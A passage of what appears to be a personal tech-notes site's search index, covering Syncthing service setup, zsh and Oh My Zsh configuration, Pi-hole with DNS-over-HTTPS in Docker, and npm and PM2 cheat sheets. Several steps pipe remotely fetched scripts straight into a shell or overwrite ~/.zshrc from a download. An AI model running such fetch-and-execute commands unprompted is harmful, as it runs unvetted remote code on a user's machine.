Then, reload the systemd daemon to apply the configuration: systemctl daemon-reload Next, start the Syncthing service with the following command depending on a user this example is root systemctl start syncthing@root To verify the status of the Syncthing service, run the following command: systemctl status syncthing@root Finally, enabled the syncthing service on boot systemctl enable syncthing@root MacOS Installation \u00b6 You can download the MacOS installation package from Syncthing Downloads , But my preferred way is to use the Homebrew package manager. brew install --cask syncthing Windows Installation \u00b6 Window installation from Syncthing Downloads installs the Syncthing as a service without any system tray icon or menu. The best way I found is to use SyncTrayzor from SyncTrayzor Github Page . It hosts and wraps Syncthing, making it behave more like a native Windows application and less like a command-line utility with a web browser interface. You can also instal it win winget with the following command: winget install SyncTrayzor . SyncTrayzor Synology DSM Installation \u00b6 In order to install Syncthing, we need to add 3 rd party packages to Synology DSM. Synology Community Packages provides packages for Synology-branded NAS devices. After we added Synology Community Packages you will be able to install Syncthing from the Cummunity tab. Permissions for the Syncthing service will be handled by the new system user sc-syncthing Syncthing Configuration \u00b6 The following configuration are the same for all the installation methods. I'm no going to cover the basic configuration, but I will show you some of my personal preferences. First to configure the Syncthing we need to access it's Web UI. The Default url is http://127.0.0.1:8384 If you are using Syncthing at remote Linux host, you can use SSH tunnel to access the Web UI. ssh -L 8001 :127.0.0.1:8384 root@192.168.102.6 This will forward 127.0.0.1:8384 from the remote host to 127.0.0.1:8001 on the local host. For security reasons, I like to disable all the Discovery and Repay services. When you disable the Discovery service, you will have to manually add the connection to other devices. Example: tcp://192.168.1.1:22000 Syncthing supports of Ignore Patterns you can use it to Ignore Files synchronization. Here is a list of the Ignore Patterns for system files: // Apple macOS (?d).DS_Store (?d).localized (?d)._* (?d).Icon* (?d).fseventsd (?d).Spotlight-V100 (?d).DocumentRevisions-V100 (?d).TemporaryItems (?d).Trashes (?d).Trash-1000 (?d).iCloud (?d)Photos Library.photoslibrary // GNU/Linux (?d).directory (?d).Trash-* // Microsoft Windows (?d)desktop.ini (?d)ehthumbs.db (?d)Thumbs.db (?d)$RECYCLE.BIN (?d)System Volume Information // QNAP QTS (?d).AppleDB (?d).@_thumb (?d).@__thumb // Synology DSM (?d)@eaDir // Adobe Lightroom *Previews.lrdata root-pixels.db // Dropbox .dropbox .dropbox.attr // Firefox & Chrome *.part *.crdownload // Microsoft Office ~* // Parallels Desktop for Mac .parallels-vm-directory // Resilio Sync .sync *.bts *.!Sync .SyncID .SyncIgnore .SyncArchive *.SyncPart *.SyncTemp *.SyncOld // Temporary and backup files *.temporary *.tmp *._mp *.old *.syd *.dir *.gid *.chk *.dmp *.nch .*.swp *~ // Vim *.*.sw[a-p] Example of working Syncthing Web UI:", "title": "Syncthing"}, {"location": "automation/syncthings/#syncthing", "text": "Syncthing is a continuous file synchronization program. Syncthing is an application that allows you to synchronize files between multiple devices. This means that creating, editing, or deleting files on one computer can be automatically copied to other devices. Official website: syncthing.net", "title": "Syncthing"}, {"location": "automation/syncthings/#debianubuntu-installation", "text": "We need to add the following Syncthing repository to the system. First, we need to add PGP keys to allow the system to check the packages authenticity sudo curl -s -o /usr/share/keyrings/syncthing-archive-keyring.gpg https://syncthing.net/release-key.gpg Then we will add the stable Syncthing repository channel to your APT sources echo \"deb [signed-by=/usr/share/keyrings/syncthing-archive-keyring.gpg] https://apt.syncthing.net/ syncthing stable\" | sudo tee /etc/apt/sources.list.d/syncthing.list Now we can update the package list and install Syncthing sudo apt update sudo apt install syncthing", "title": "Debian/Ubuntu Installation"}, {"location": "automation/syncthings/#configuration-syncthing-as-a-service", "text": "Configuring Syncthing as a service will provide as the ability to start and stop and enable/disable the service at boot. Create a systemd unit file for managing the Syncthing service. nano /etc/systemd/system/syncthing@.service In the next example we will be setting the Syncthing service UI to listen on local host (127.0.0.1) and port 8384 Add the following lines to the syncthing@.service : [Unit] Description = Syncthing - Open Source Continuous File Synchronization for % I Documentation = man : syncthing ( 1 ) After = network . target [Service] User = % i ExecStart = / usr / bin / syncthing - no-browser - gui-address = \"127.0.0.1:8384\" - no-restart - logflags = 0 Restart = on-failure SuccessExitStatus = 3 4 RestartForceExitStatus = 3 4 [Install] WantedBy = multi-user . target Save and close the file when you are finished. Then, reload the systemd daemon to apply the configuration: systemctl daemon-reload Next, start the Syncthing service with the following command depending on a user this example is root systemctl start syncthing@root To verify the status of the Syncthing service, run the following command: systemctl status syncthing@root Finally, enabled the syncthing service on boot systemctl enable syncthing@root", "title": "Configuration Syncthing as a Service"}, {"location": "automation/syncthings/#macos-installation", "text": "You can download the MacOS installation package from Syncthing Downloads , But my preferred way is to use the Homebrew package manager. brew install --cask syncthing", "title": "MacOS Installation"}, {"location": "automation/syncthings/#windows-installation", "text": "Window installation from Syncthing Downloads installs the Syncthing as a service without any system tray icon or menu. The best way I found is to use SyncTrayzor from SyncTrayzor Github Page . It hosts and wraps Syncthing, making it behave more like a native Windows application and less like a command-line utility with a web browser interface. You can also instal it win winget with the following command: winget install SyncTrayzor . SyncTrayzor", "title": "Windows Installation"}, {"location": "automation/syncthings/#synology-dsm-installation", "text": "In order to install Syncthing, we need to add 3 rd party packages to Synology DSM. Synology Community Packages provides packages for Synology-branded NAS devices. After we added Synology Community Packages you will be able to install Syncthing from the Cummunity tab. Permissions for the Syncthing service will be handled by the new system user sc-syncthing", "title": "Synology DSM Installation"}, {"location": "automation/syncthings/#syncthing-configuration", "text": "The following configuration are the same for all the installation methods. I'm no going to cover the basic configuration, but I will show you some of my personal preferences. First to configure the Syncthing we need to access it's Web UI. The Default url is http://127.0.0.1:8384 If you are using Syncthing at remote Linux host, you can use SSH tunnel to access the Web UI. ssh -L 8001 :127.0.0.1:8384 root@192.168.102.6 This will forward 127.0.0.1:8384 from the remote host to 127.0.0.1:8001 on the local host. For security reasons, I like to disable all the Discovery and Repay services. When you disable the Discovery service, you will have to manually add the connection to other devices. Example: tcp://192.168.1.1:22000 Syncthing supports of Ignore Patterns you can use it to Ignore Files synchronization. Here is a list of the Ignore Patterns for system files: // Apple macOS (?d).DS_Store (?d).localized (?d)._* (?d).Icon* (?d).fseventsd (?d).Spotlight-V100 (?d).DocumentRevisions-V100 (?d).TemporaryItems (?d).Trashes (?d).Trash-1000 (?d).iCloud (?d)Photos Library.photoslibrary // GNU/Linux (?d).directory (?d).Trash-* // Microsoft Windows (?d)desktop.ini (?d)ehthumbs.db (?d)Thumbs.db (?d)$RECYCLE.BIN (?d)System Volume Information // QNAP QTS (?d).AppleDB (?d).@_thumb (?d).@__thumb // Synology DSM (?d)@eaDir // Adobe Lightroom *Previews.lrdata root-pixels.db // Dropbox .dropbox .dropbox.attr // Firefox & Chrome *.part *.crdownload // Microsoft Office ~* // Parallels Desktop for Mac .parallels-vm-directory // Resilio Sync .sync *.bts *.!Sync .SyncID .SyncIgnore .SyncArchive *.SyncPart *.SyncTemp *.SyncOld // Temporary and backup files *.temporary *.tmp *._mp *.old *.syd *.dir *.gid *.chk *.dmp *.nch .*.swp *~ // Vim *.*.sw[a-p] Example of working Syncthing Web UI:", "title": "Syncthing Configuration"}, {"location": "automation/guides/better-terminal-experience/", "tags": ["macos", "linux", "terminal", "zsh", "oh-my-zsh"], "text": "Better Terminal Experience \u00b6 Introduction \u00b6 I have been using terminal for a long time, it's one of my essential tools for my everyday work and hobbies. The default terminal experience is not very user friendly, and I find it sometimes frustrating to use for basic tasks. So I decided to make a better terminal experience for macOS and Linux without too much effort from user side. This guide will help you to install and configure the **better terminal experience in less than 5 minutes. Better Terminal Experience guide based on ZSH Shell with Oh My Zsh on top of it. Using built-in theme called Bira , zsh auto suggestions plugin that suggests commands as you type based on history and completions and zsh syntax highlighting plugin that highlighting of commands whilst they are typed at a zsh prompt into an interactive terminal. What's ZSH \u00b6 Z-shell (Zsh) is a Unix shell that can be used as an interactive login shell and as a shell scripting command interpreter. Zsh is an enhanced Bourne shell with many enhancements, including some Bash, ksh and tcsh features. What's Oh-My-Zsh \u00b6 Oh My Zsh is an open source, community-driven framework for managing your zsh configuration. MacOS Installation \u00b6 My personal preference is to use iTerm2 as a replacement for macOS default Terminal. Homebrew Package Manager \u00b6 We need a package manager to install all the required packages. Homebrew is a package manager for macOS. if you don't have it, you can install it with the following command: /bin/bash -c \" $( curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh ) \" Requirements Installation \u00b6 Using Homebrew, we can install the following packages: zsh, git, wget, zsh-autosuggestions zsh-syntax-highlighting brew install git wget zsh zsh-autosuggestions zsh-syntax-highlighting Oh My Zsh Installation \u00b6 We can proceed to install Oh My Zsh with the following command: sh -c \" $( wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - ) \" Answer Yes when asked to change the default shell to zsh. Oh My Zsh Configuration \u00b6 Oh My Zsh crates a default configuration file called .zshrc in the user's home directory. We need to edit the configuration file. You can use any editor to edit the file. nano example: nano ~/.zshrc We need to add or change the following lines to the configuration file: Find the theme and change it to bira ZSH_THEME = \"bira\" find the plugins and change it to the following: plugins =( git colored-man-pages docker docker-compose iterm2 node npm brew pip colorize macos pyenv colorize adb aws command-not-found virtualenv poetry ) Since we have intel and arm based macs the homebrew path is different. So i've made it to load the proper plugins based on the cpu architecture. The autosuggestions plugin has a bug with copy and paste so there is a workaround for that. Append the following to the end of the config: # Loads the plugins from /usr/local for intel based if [ $( arch ) = \"i386\" ] ; then source /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh source /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh fi # Loads the plugins from /opt/homebrew/ for arm based if [ $( arch ) = \"arm64\" ] ; then source /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh source /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh fi # Fix for Slow zsh-autosuggestions copy&paste autoload -Uz bracketed-paste-magic zle -N bracketed-paste bracketed-paste-magic zstyle ':bracketed-paste-magic' active-widgets '.self-*' Save and exit the file. Open new terminal windown and enjoy Better Terminal Experience! Linux Installation \u00b6 The instructions bellow are for Debian Linux with apt as package manager. If you are using another package manager, just change the commands to install the packages. Requirements \u00b6 git zsh wget Install the following requirements packages with the following commands: apt install -y git zsh wget Oh My Zsh \u00b6 We can proceed to install Oh My Zsh with the following command: sh -c \" $( wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - ) \" Answer Yes when asked to change the default shell to zsh. Install Autosuggestions, Syntax-Highlighting Plugins using git clone: git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting ~/.zsh/zsh-syntax-highlighting Auto Config Installation \u00b6 Danger The following commands will overwrite your current config if exists. Make sure you have a backup of your config before proceeding!!! wget -O ~/.zshrc https://3os.org/assets/zshrc_config For non root user eddit the config file: nano ~/.zshrc Change the export ZSH=\"users-home-dir-path\" to users' home directory path. # Path to your oh-my-zsh installation. export ZSH = \"/home/ ${ USER } /.oh-my-zsh\" Oh My Zsh Manual Configuration \u00b6 Oh My Zsh crates a default configuration file called .zshrc in the user's home directory. We need to edit the configuration file. You can use any editor to edit the file. nano example: nano ~/.zshrc We need to add or change the following lines to the configuration file: Find the theme and change it to bira ZSH_THEME = \"bira\" find the plugins and change it to the following: plugins =( git colored-man-pages docker docker-compose iterm2 node npm brew pip colorize macos pyenv colorize adb aws command-not-found virtualenv poetry ) The autosuggestions plugin has a bug with copy and paste so there is a workaround for that. Append the following to the end of the config to activate the workaround and to load the plugins: ## Shell Integration and plugins source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh source ~/.zsh/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ## Fix for Slow zsh-autosuggestions copy&paste autoload -Uz bracketed-paste-magic zle -N bracketed-paste bracketed-paste-magic zstyle ':bracketed-paste-magic' active-widgets '.self-*' Save and exit the file. Open new terminal window and enjoy Better Terminal Experience!", "title": "Better Terminal Experience"}, {"location": "automation/guides/better-terminal-experience/#better-terminal-experience", "text": "", "title": "Better Terminal Experience"}, {"location": "automation/guides/better-terminal-experience/#introduction", "text": "I have been using terminal for a long time, it's one of my essential tools for my everyday work and hobbies. The default terminal experience is not very user friendly, and I find it sometimes frustrating to use for basic tasks. So I decided to make a better terminal experience for macOS and Linux without too much effort from user side. This guide will help you to install and configure the **better terminal experience in less than 5 minutes. Better Terminal Experience guide based on ZSH Shell with Oh My Zsh on top of it. Using built-in theme called Bira , zsh auto suggestions plugin that suggests commands as you type based on history and completions and zsh syntax highlighting plugin that highlighting of commands whilst they are typed at a zsh prompt into an interactive terminal.", "title": "Introduction"}, {"location": "automation/guides/better-terminal-experience/#whats-zsh", "text": "Z-shell (Zsh) is a Unix shell that can be used as an interactive login shell and as a shell scripting command interpreter. Zsh is an enhanced Bourne shell with many enhancements, including some Bash, ksh and tcsh features.", "title": "What's ZSH"}, {"location": "automation/guides/better-terminal-experience/#whats-oh-my-zsh", "text": "Oh My Zsh is an open source, community-driven framework for managing your zsh configuration.", "title": "What's Oh-My-Zsh"}, {"location": "automation/guides/better-terminal-experience/#macos-installation", "text": "My personal preference is to use iTerm2 as a replacement for macOS default Terminal.", "title": "MacOS Installation"}, {"location": "automation/guides/better-terminal-experience/#homebrew-package-manager", "text": "We need a package manager to install all the required packages. Homebrew is a package manager for macOS. if you don't have it, you can install it with the following command: /bin/bash -c \" $( curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh ) \"", "title": "Homebrew Package Manager"}, {"location": "automation/guides/better-terminal-experience/#requirements-installation", "text": "Using Homebrew, we can install the following packages: zsh, git, wget, zsh-autosuggestions zsh-syntax-highlighting brew install git wget zsh zsh-autosuggestions zsh-syntax-highlighting", "title": "Requirements Installation"}, {"location": "automation/guides/better-terminal-experience/#oh-my-zsh-installation", "text": "We can proceed to install Oh My Zsh with the following command: sh -c \" $( wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - ) \" Answer Yes when asked to change the default shell to zsh.", "title": "Oh My Zsh Installation"}, {"location": "automation/guides/better-terminal-experience/#oh-my-zsh-configuration", "text": "Oh My Zsh crates a default configuration file called .zshrc in the user's home directory. We need to edit the configuration file. You can use any editor to edit the file. nano example: nano ~/.zshrc We need to add or change the following lines to the configuration file: Find the theme and change it to bira ZSH_THEME = \"bira\" find the plugins and change it to the following: plugins =( git colored-man-pages docker docker-compose iterm2 node npm brew pip colorize macos pyenv colorize adb aws command-not-found virtualenv poetry ) Since we have intel and arm based macs the homebrew path is different. So i've made it to load the proper plugins based on the cpu architecture. The autosuggestions plugin has a bug with copy and paste so there is a workaround for that. Append the following to the end of the config: # Loads the plugins from /usr/local for intel based if [ $( arch ) = \"i386\" ] ; then source /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh source /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh fi # Loads the plugins from /opt/homebrew/ for arm based if [ $( arch ) = \"arm64\" ] ; then source /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh source /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh fi # Fix for Slow zsh-autosuggestions copy&paste autoload -Uz bracketed-paste-magic zle -N bracketed-paste bracketed-paste-magic zstyle ':bracketed-paste-magic' active-widgets '.self-*' Save and exit the file. Open new terminal windown and enjoy Better Terminal Experience!", "title": "Oh My Zsh Configuration"}, {"location": "automation/guides/better-terminal-experience/#linux-installation", "text": "The instructions bellow are for Debian Linux with apt as package manager. If you are using another package manager, just change the commands to install the packages.", "title": "Linux Installation"}, {"location": "automation/guides/better-terminal-experience/#requirements", "text": "git zsh wget Install the following requirements packages with the following commands: apt install -y git zsh wget", "title": "Requirements"}, {"location": "automation/guides/better-terminal-experience/#oh-my-zsh", "text": "We can proceed to install Oh My Zsh with the following command: sh -c \" $( wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - ) \" Answer Yes when asked to change the default shell to zsh. Install Autosuggestions, Syntax-Highlighting Plugins using git clone: git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting ~/.zsh/zsh-syntax-highlighting", "title": "Oh My Zsh"}, {"location": "automation/guides/better-terminal-experience/#auto-config-installation", "text": "Danger The following commands will overwrite your current config if exists. Make sure you have a backup of your config before proceeding!!! wget -O ~/.zshrc https://3os.org/assets/zshrc_config For non root user eddit the config file: nano ~/.zshrc Change the export ZSH=\"users-home-dir-path\" to users' home directory path. # Path to your oh-my-zsh installation. export ZSH = \"/home/ ${ USER } /.oh-my-zsh\"", "title": "Auto Config Installation"}, {"location": "automation/guides/better-terminal-experience/#oh-my-zsh-manual-configuration", "text": "Oh My Zsh crates a default configuration file called .zshrc in the user's home directory. We need to edit the configuration file. You can use any editor to edit the file. nano example: nano ~/.zshrc We need to add or change the following lines to the configuration file: Find the theme and change it to bira ZSH_THEME = \"bira\" find the plugins and change it to the following: plugins =( git colored-man-pages docker docker-compose iterm2 node npm brew pip colorize macos pyenv colorize adb aws command-not-found virtualenv poetry ) The autosuggestions plugin has a bug with copy and paste so there is a workaround for that. Append the following to the end of the config to activate the workaround and to load the plugins: ## Shell Integration and plugins source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh source ~/.zsh/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ## Fix for Slow zsh-autosuggestions copy&paste autoload -Uz bracketed-paste-magic zle -N bracketed-paste bracketed-paste-magic zstyle ':bracketed-paste-magic' active-widgets '.self-*' Save and exit the file. Open new terminal window and enjoy Better Terminal Experience!", "title": "Oh My Zsh Manual Configuration"}, {"location": "automation/guides/pihole-doh/", "tags": ["pi-hole", "doh", "docker", "dns", "dns-over-https"], "text": "Pi-hole as DNS Server with DNS over HTTPS (DOH) Based on Docker Containers \u00b6 What's Pi-hole? \u00b6 Pi-hole Official Website Official Website . Pi-hole is a DNS server that is designed to block ads and trackers. It is a free and open source software project. It's based on blocklists and acts as a DNS sinkhole. What's DNS over HTTPS (DOH)? \u00b6 DNS over HTTPS (DoH) is an internet security protocol that communicates domain name server information in an encrypted way over HTTPS connections. My Pi-hole Setup \u00b6 My setup fully depends on pi-hole dns server, that's why I use two servers one as primary DNS Server and the second as secondary DNS server. I've configured my router as a DNS server for all the DHCP clients with primary and the secondary DNS as my pi-hole servers. This way all the clients requests the router to resolve the DNS and the router forwards the request to the pi-hole servers. Pi-hole-1 runs on ubuntu server (virtual machine) Pi-hole-2 runs on Raspberry Pi Warning This is not a step by step guide for all the configurations of pihole or how to use docker containers. The following instuctions include only the deployemt of the pi-hole server with DoH providers. Installation \u00b6 We Will be using docker-compose to deploy the pi-hole server with DoH providers with a single configuration file. The following docker-compose.yml includes two images: Pi-hole container , and cloudflared container . When you run docker-compose up the containers will be created and started. I't will create internal network for the pihole and two instances of cloudflared. When a request comes in the pihole will forward the request to the cloudflared instances one of them will use Cloudflare DNS servers and the other will use Google's DNS servers. There is no need to configure the pihole's DNS server at the UI since the configuration is done by docker-compose.yml file. When using this setup two folders will be created on the Host machine for persistent storage of the containers: config, dnsmasq.d . Those folders will be mounted to the containers when its running/restarted/recreated. Those folders will be created at the root folder of the docker-compose.yml file. Create a folder for the deployment of the containers at your host machine. create a file named docker-compose.yml at the root folder and copy the following content to it: version : '2.4' services : pihole : container_name : pihole hostname : pihole restart : always image : pihole/pihole networks : dns : ipv4_address : 172.20.0.9 depends_on : google-8.8.8.8 : condition : service_started cloudflare-1.1.1.1 : condition : service_started volumes : - ./config:/etc/pihole/ - ./dnsmasq.d:/etc/dnsmasq.d/ - /etc/localtime:/etc/localtime ports : - '7003:80' - '53:53/tcp' - '53:53/udp' environment : - ServerIP=127.0.0.1 - WEBPASSWORD=ChangeMe - PIHOLE_DNS_=172.20.0.10;172.20.0.12 cloudflare-1.1.1.1 : container_name : cloudflare-1.1.1.1 hostname : cloudflare-1.1.1.1 restart : always image : visibilityspots/cloudflared networks : dns : ipv4_address : 172.20.0.10 expose : - '53/tcp' - '53/udp' environment : - PORT=53 - UPSTREAM1=https://1.1.1.1/dns-query - UPSTREAM2=https://1.1.1.1/dns-query volumes : - /etc/localtime:/etc/localtime google-8.8.8.8 : container_name : google-8.8.8.8 hostname : google-8.8.8.8 restart : always image : visibilityspots/cloudflared networks : dns : ipv4_address : 172.20.0.12 expose : - '53/tcp' - '53/udp' environment : - PORT=53 - UPSTREAM1=https://8.8.8.8/dns-query - UPSTREAM2=https://8.8.8.8/dns-query volumes : - /etc/localtime:/etc/localtime networks : dns : ipam : config : - subnet : 172.20.0.0/24 Now run docker-compose up -d to create the containers. If all went well you should should be able to access the pihole server at http://127.0.0.1.7003 with password ChangeMe from the config above. Now you need to change your dns server to point to the pihole server. We are done with the installation.", "title": "Pi-hole with DOH on Docker"}, {"location": "automation/guides/pihole-doh/#pi-hole-as-dns-server-with-dns-over-https-doh-based-on-docker-containers", "text": "", "title": "Pi-hole as DNS Server with DNS over HTTPS (DOH) Based on Docker Containers"}, {"location": "automation/guides/pihole-doh/#whats-pi-hole", "text": "Pi-hole Official Website Official Website . Pi-hole is a DNS server that is designed to block ads and trackers. It is a free and open source software project. It's based on blocklists and acts as a DNS sinkhole.", "title": "What's Pi-hole?"}, {"location": "automation/guides/pihole-doh/#whats-dns-over-https-doh", "text": "DNS over HTTPS (DoH) is an internet security protocol that communicates domain name server information in an encrypted way over HTTPS connections.", "title": "What's DNS over HTTPS (DOH)?"}, {"location": "automation/guides/pihole-doh/#my-pi-hole-setup", "text": "My setup fully depends on pi-hole dns server, that's why I use two servers one as primary DNS Server and the second as secondary DNS server. I've configured my router as a DNS server for all the DHCP clients with primary and the secondary DNS as my pi-hole servers. This way all the clients requests the router to resolve the DNS and the router forwards the request to the pi-hole servers. Pi-hole-1 runs on ubuntu server (virtual machine) Pi-hole-2 runs on Raspberry Pi Warning This is not a step by step guide for all the configurations of pihole or how to use docker containers. The following instuctions include only the deployemt of the pi-hole server with DoH providers.", "title": "My Pi-hole Setup"}, {"location": "automation/guides/pihole-doh/#installation", "text": "We Will be using docker-compose to deploy the pi-hole server with DoH providers with a single configuration file. The following docker-compose.yml includes two images: Pi-hole container , and cloudflared container . When you run docker-compose up the containers will be created and started. I't will create internal network for the pihole and two instances of cloudflared. When a request comes in the pihole will forward the request to the cloudflared instances one of them will use Cloudflare DNS servers and the other will use Google's DNS servers. There is no need to configure the pihole's DNS server at the UI since the configuration is done by docker-compose.yml file. When using this setup two folders will be created on the Host machine for persistent storage of the containers: config, dnsmasq.d . Those folders will be mounted to the containers when its running/restarted/recreated. Those folders will be created at the root folder of the docker-compose.yml file. Create a folder for the deployment of the containers at your host machine. create a file named docker-compose.yml at the root folder and copy the following content to it: version : '2.4' services : pihole : container_name : pihole hostname : pihole restart : always image : pihole/pihole networks : dns : ipv4_address : 172.20.0.9 depends_on : google-8.8.8.8 : condition : service_started cloudflare-1.1.1.1 : condition : service_started volumes : - ./config:/etc/pihole/ - ./dnsmasq.d:/etc/dnsmasq.d/ - /etc/localtime:/etc/localtime ports : - '7003:80' - '53:53/tcp' - '53:53/udp' environment : - ServerIP=127.0.0.1 - WEBPASSWORD=ChangeMe - PIHOLE_DNS_=172.20.0.10;172.20.0.12 cloudflare-1.1.1.1 : container_name : cloudflare-1.1.1.1 hostname : cloudflare-1.1.1.1 restart : always image : visibilityspots/cloudflared networks : dns : ipv4_address : 172.20.0.10 expose : - '53/tcp' - '53/udp' environment : - PORT=53 - UPSTREAM1=https://1.1.1.1/dns-query - UPSTREAM2=https://1.1.1.1/dns-query volumes : - /etc/localtime:/etc/localtime google-8.8.8.8 : container_name : google-8.8.8.8 hostname : google-8.8.8.8 restart : always image : visibilityspots/cloudflared networks : dns : ipv4_address : 172.20.0.12 expose : - '53/tcp' - '53/udp' environment : - PORT=53 - UPSTREAM1=https://8.8.8.8/dns-query - UPSTREAM2=https://8.8.8.8/dns-query volumes : - /etc/localtime:/etc/localtime networks : dns : ipam : config : - subnet : 172.20.0.0/24 Now run docker-compose up -d to create the containers. If all went well you should should be able to access the pihole server at http://127.0.0.1.7003 with password ChangeMe from the config above. Now you need to change your dns server to point to the pihole server. We are done with the installation.", "title": "Installation"}, {"location": "development/node-npm/npm/", "tags": ["npm", "cheat-sheet", "node"], "text": "Npm Command-line Utility \u00b6 npm is two things: first and foremost, it is an online repository for the publishing of open-source Node.js projects; second, it is a command-line utility for interacting with said repository that aids in package installation, version management, and dependency management. A plethora of Node.js libraries and applications are published on npm, and many more are added every day. Updating Node & npm to Latest Stable Version \u00b6 npm: npm install -g npm node: npm cache clean -f npm install -g n n stable Updating Local Project Packages \u00b6 Navigate to the root directory of your project and ensure it contains a package.json In your project root directory, run: npm update To test the update, run the outdated command. There should not be any output . npm outdated Updating Globally-Installed Packages \u00b6 To see which global packages need to be updated, on the command line, run: npm outdated -g --depth = 0 To update a single global package, on the command line, run: npm update -g <package_name> To update all global packages, on the command line, run: npm update -g", "title": "Npm Command-line Utility"}, {"location": "development/node-npm/npm/#npm-command-line-utility", "text": "npm is two things: first and foremost, it is an online repository for the publishing of open-source Node.js projects; second, it is a command-line utility for interacting with said repository that aids in package installation, version management, and dependency management. A plethora of Node.js libraries and applications are published on npm, and many more are added every day.", "title": "Npm Command-line Utility"}, {"location": "development/node-npm/npm/#updating-node-npm-to-latest-stable-version", "text": "npm: npm install -g npm node: npm cache clean -f npm install -g n n stable", "title": "Updating Node &amp; npm to Latest Stable Version"}, {"location": "development/node-npm/npm/#updating-local-project-packages", "text": "Navigate to the root directory of your project and ensure it contains a package.json In your project root directory, run: npm update To test the update, run the outdated command. There should not be any output . npm outdated", "title": "Updating Local Project Packages"}, {"location": "development/node-npm/npm/#updating-globally-installed-packages", "text": "To see which global packages need to be updated, on the command line, run: npm outdated -g --depth = 0 To update a single global package, on the command line, run: npm update -g <package_name> To update all global packages, on the command line, run: npm update -g", "title": "Updating Globally-Installed Packages"}, {"location": "development/node-npm/pm2/", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"], "text": "PM2 - Node.js Process Manager \u00b6 PM2 is a daemon process manager that will help you manage and keep your application online. Getting started with PM2 is straightforward, it is offered as a simple and intuitive CLI, installable via NPM. Follow the official documentation for installation and usage instructions: PM2 Official Documentation Installation \u00b6 The latest PM2 version is installable with NPM or Yarn: npm install pm2@latest -g # or yarn global add pm2 Start An Application With PM2 \u00b6 The simplest way to start, daemonize and monitor your application is by using this command line: pm2 start app.js Start Application With Detailed Time For Logs \u00b6 pm2 start app.js --log-date-format \"YYYY-MM-DD HH:mm:ss\" Managing Processes \u00b6 Managing application state is simple here are the commands: pm2 restart app_name pm2 reload app_name pm2 stop app_name pm2 delete app_name Save Configuration of Processes to PM2 \u00b6 And to freeze a process list for automatic respawn: pm2 save List Managed Applications \u00b6 List the status of all application managed by PM2: pm2 [ list | ls | status ] Display Logs \u00b6 To display logs in realtime for all processes managed by PM2, use the following command: pm2 logs To display logs in realtime for all processes managed by PM2, for last 200 lines use the following command: pm2 logs --lines 200 To display logs in realtime for specific process, use the following command: pm2 logs <app_name>/<id> To display logs in realtime for specific process, for last 200 lines use the following command: pm2 logs <app_name>/<id> --lines 200 Auto Startup PM2 \u00b6 Restarting PM2 with the processes you manage on server boot/reboot is critical. To solve this, just run this command to generate an active startup script: pm2 startup Auto Startup PM2 on Raspberry Pi \u00b6 When using PM2 on Raspberry Pi . You will encounter a problem when you try to start pm2 with the default command. sudo env PATH = $PATH :/usr/local/bin pm2 startup systemd -u pi --hp /home/pi Updating PM2 \u00b6 It's very useful to update PM2 to the latest version specially when you update your Node.js version. Since updating node usually will brake the pm2 process to function properly, you can use the following command to update PM2: npm install pm2@latest -g Then update the in-memory PM2: pm2 update You can also create a alias to update PM2 with one command: alias pm2update = 'npm install pm2@latest -g && pm2 update && pm2 save'", "title": "PM2 - Node.js Process Manager"}, {"location": "development/node-npm/pm2/#pm2-nodejs-process-manager", "text": "PM2 is a daemon process manager that will help you manage and keep your application online. Getting started with PM2 is straightforward, it is offered as a simple and intuitive CLI, installable via NPM. Follow the official documentation for installation and usage instructions: PM2 Official Documentation", "title": "PM2 - Node.js Process Manager"}, {"location": "development/node-npm/pm2/#installation", "text": "The latest PM2 version is installable with NPM or Yarn: npm install pm2@latest -g # or yarn global add pm2", "title": "Installation"}, {"location": "development/node-npm/pm2/#start-an-application-with-pm2", "text": "The simplest way to start, daemonize and monitor your application is by using this command line: pm2 start app.js", "title": "Start An Application With PM2"}, {"location": "development/node-npm/pm2/#start-application-with-detailed-time-for-logs", "text": "pm2 start app.js --log-date-format \"YYYY-MM-DD HH:mm:ss\"", "title": "Start Application With Detailed Time For Logs"}, {"location": "development/node-npm/pm2/#managing-processes", "text": "Managing application state is simple here are the commands: pm2 restart app_name pm2 reload app_name pm2 stop app_name pm2 delete app_name", "title": "Managing Processes"}, {"location": "development/node-npm/pm2/#save-configuration-of-processes-to-pm2", "text": "And to freeze a process list for automatic respawn: pm2 save", "title": "Save Configuration of Processes to PM2"}, {"location": "development/node-npm/pm2/#list-managed-applications", "text": "List the status of all application managed by PM2: pm2 [ list | ls | status ]", "title": "List Managed Applications"}, {"location": "development/node-npm/pm2/#display-logs", "text": "To display logs in realtime for all processes managed by PM2, use the following command: pm2 logs To display logs in realtime for all processes managed by PM2, for last 200 lines use the following command: pm2 logs --lines 200 To display logs in realtime for specific process, use the following command: pm2 logs <app_name>/<id> To display logs in realtime for specific process, for last 200 lines use the following command: pm2 logs <app_name>/<id> --lines 200", "title": "Display Logs"}, {"location": "development/node-npm/pm2/#auto-startup-pm2", "text": "Restarting PM2 with the processes you manage on server boot/reboot is critical. To solve this, just run this command to generate an active startup script: pm2 startup", "title": "Auto Startup PM2"}, {"location": 